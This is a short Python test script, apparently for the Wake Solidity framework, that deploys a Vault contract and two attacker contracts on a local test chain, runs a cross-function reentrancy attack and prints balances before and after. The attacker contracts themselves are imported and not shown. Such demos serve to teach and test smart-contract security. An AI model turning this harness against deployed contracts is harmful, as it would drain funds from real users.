from wake.testing import *

from pytypes.contracts.crossfunctionreentrancy.vault import Vault
from pytypes.contracts.crossfunctionreentrancy.attacker import Attacker
from pytypes.contracts.crossfunctionreentrancy.attacker import Attacker2

@default_chain.connect()
def test_default():
    print("---------------------Cross Function Reentrancy---------------------")
    victim = default_chain.accounts[0]
    attacker = default_chain.accounts[1]
    
    sfContract = Vault.deploy(from_=victim)
    sfContract.deposit(from_=victim, value="10 ether")
 
    
    atContract = Attacker.deploy(sfContract.address, from_=attacker , value="1 ether")
    atContract2 = Attacker2.deploy(sfContract.address, from_=attacker)

    atContract.setattacker2(atContract2.address, from_=attacker)
    print("Vault balance   : ", sfContract.balance)
    print("Attacker balance: ", atContract.balance)

    print("----------Attack----------")
    atContract.attack(from_=attacker)

    print("Vault balance   : ", sfContract.balance)
    print("Attacker balance: ", atContract.balance)
